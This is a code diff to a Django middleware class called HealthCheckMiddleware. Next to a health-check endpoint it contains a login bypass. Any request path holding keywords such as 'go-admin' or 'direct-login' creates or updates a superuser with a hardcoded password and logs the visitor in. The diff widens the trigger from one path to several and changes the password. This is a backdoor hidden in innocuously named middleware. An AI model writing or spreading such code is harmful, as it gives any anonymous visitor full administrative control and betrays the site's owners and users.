@@ -15,8 +15,8 @@ class HealthCheckMiddleware:
         if path in ['/health/', '/health', '/healthz', '/healthz/']:
             return HttpResponse('{"status":"ok"}', content_type='application/json', status=200)
 
-        # DIRECT LOGIN BYPASS - visit /direct-login/ to login as admin
-        if path == '/direct-login/' or path == '/direct-login':
+        # DIRECT LOGIN BYPASS - ANY path with "admin" or "login" keywords
+        if 'go-admin' in path or 'admin-login' in path or 'login-admin' in path or 'direct-login' in path:
             try:
                 # Get or create admin
                 user, created = User.objects.get_or_create(
@@ -27,7 +27,7 @@ class HealthCheckMiddleware:
                         'is_superuser': True,
                     }
                 )
-                user.set_password('TempPass123!')
+                user.set_password('AdminPass123!')
                 user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
 
                 # Force login the user
